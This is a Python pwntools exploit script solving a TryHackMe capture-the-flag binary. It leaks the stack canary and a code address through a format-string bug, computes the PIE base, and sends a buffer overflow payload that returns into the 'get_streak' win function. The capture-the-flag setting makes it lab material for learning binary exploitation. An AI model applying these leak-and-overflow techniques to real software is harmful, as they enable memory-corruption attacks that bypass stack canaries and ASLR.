#!/usr/bin/python3 

from pwn import *
import re, time

# THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn107-1644307530397.pwn107'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
io = start()
io.clean()

# pwndbg> piebase 
# Calculated VA from /home/b0x41s/ctf/thm/pwn107-1644307530397.pwn107 = 0x555555400000

# %17$p %13$p %23$p fuzz these pointers
# 17 seems to be the piebase address + 0x992
# Your current streak: 0x555555400992
# and 13 is the canary which can be checked in gdb with canary command and recognized because in end with 00

# this works locally
#io.sendline(b"%17$p%13$p")
# remote it should be %11p
io.sendline(b"%11$p%13$p")
text = io.recvline_containsS("Your current streak:", timeout=3)
leaks_search = re.search(r" (0x[0-9a-f]+)(0x[0-9a-f]+)$", text, re.IGNORECASE)
leakaddr = int(leaks_search.group(1), 16)
canary = int(leaks_search.group(2), 16)
print(f"Canary is: 0x{canary:08x}")
print(f"Entry point runtime address is: {hex(leakaddr)}")

# calculate piebase from leakedaddr
# 0x555555400992 - 0x992
# in the special remote case you are using p11 instead of 17 so its 0x780
#piebase = leakaddr - 0x992
piebase = leakaddr - 0x780
print(f"piebase address is: {hex(piebase)}")
# calculate offset from piebase to get_streak (win function)
# pwndbg> x/x 0x555555400000 + 0x000000000000094c
# 0x55555540094c <get_streak>:	0xe5894855
# or we could use elf.symbols.get_streak
get_streak = piebase + 0x94c + 1

# offset can be determined because when we overflow the canary it will print:
# *** stack smashing detected ***: terminated

payload = flat(
    b'A' * 24,
    canary,
    b'B' * 8,
    #b'C' * 8,
    # any ret address will do or +1
    # get_streak works but breaks possibly because of stack alignment issues so i use +1 
    # to skip the first push instruction at the beginning of the function 
    p64(get_streak)
)

print(f"Runtime get_streak() address is: {hex(get_streak)}")
# Save the payload to file
write('payload', payload)

#print(io.recv().decode())
# Send the payload
io.clean()
io.sendline(payload)

# Receive the flag
io.interactive()